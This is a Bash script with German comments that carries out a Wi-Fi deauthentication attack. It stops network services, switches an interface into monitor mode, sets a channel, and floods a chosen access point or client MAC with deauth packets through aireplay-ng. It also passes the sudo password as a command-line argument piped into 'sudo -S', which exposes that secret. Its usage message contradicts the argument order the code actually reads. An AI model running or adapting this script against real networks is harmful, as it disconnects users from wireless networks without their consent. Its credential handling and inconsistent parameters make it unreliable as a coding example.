#!/bin/bash


# -----------------------------------------------------------------------------
# 0) Parameter prüfen
# -----------------------------------------------------------------------------
INTERFACE="$1"              # z.B. wlan0
TARGET_MAC="$2"             # BSSID oder Client-MAC, z.B. AA:BB:CC:DD:EE:FF
PACKETS="$3"                
CHANNEL="$4"         
SECRET="$5"                 # sudo-Passwort

if [[ -z "$INTERFACE" || -z "$TARGET_MAC" || -z "$CHANNEL" || -z "$SECRET" ]]; then
  echo "Usage: $0 <interface> <target_mac> <channel> [packets] <sudo-secret>"
  exit 1
fi

# -----------------------------------------------------------------------------
# 1) Interferierende Prozesse beenden
# -----------------------------------------------------------------------------
# Beende eventuelle laufende Tools
echo "$SECRET" | sudo -S killall airodump-ng aircrack-ng >/dev/null 2>&1 || true
# Deaktiviere NetworkManager, wpa_supplicant, dhcpcd etc.
echo "$SECRET" | sudo -S airmon-ng check kill >/dev/null 2>&1 || true

# -----------------------------------------------------------------------------
# 2) Interface in Monitor-Mode versetzen
# -----------------------------------------------------------------------------
echo "[i] Setze Interface '$INTERFACE' in den Monitor-Modus"
echo "$SECRET" | sudo -S ip link set "$INTERFACE" down
# Versuch moderner iw-CLI, fallback auf iwconfig
if ! echo "$SECRET" | sudo -S iw dev "$INTERFACE" set type monitor; then
  echo "$SECRET" | sudo -S iwconfig "$INTERFACE" mode Monitor
fi

echo "$SECRET" | sudo -S ip link set "$INTERFACE" up
# Deaktiviere Energiesparen
echo "$SECRET" | sudo -S iw dev "$INTERFACE" set power_save off >/dev/null 2>&1 || true

# -----------------------------------------------------------------------------
# 3) Kanal setzen
# -----------------------------------------------------------------------------
echo "[i] Setze Interface '$INTERFACE' auf Kanal $CHANNEL"
# Primär iwconfig, fallback iw
echo "$SECRET" | sudo -S iwconfig "$INTERFACE" channel "$CHANNEL" || (echo "$SECRET" | sudo -S iw dev "$INTERFACE" set channel "$CHANNEL")
# Warte kurz, damit der Treiber den Kanal wechseln kann
sleep 1

# -----------------------------------------------------------------------------
# 4) Deauth-Pakete senden
# -----------------------------------------------------------------------------
echo "[i] Sende $PACKETS Deauth-Pakete an $TARGET_MAC über Interface '$INTERFACE' (Kanal '$CHANNEL')"
echo "$SECRET" | sudo -S aireplay-ng --deauth "$PACKETS" -a "$TARGET_MAC" "$INTERFACE"

# Script Ende
exit 0

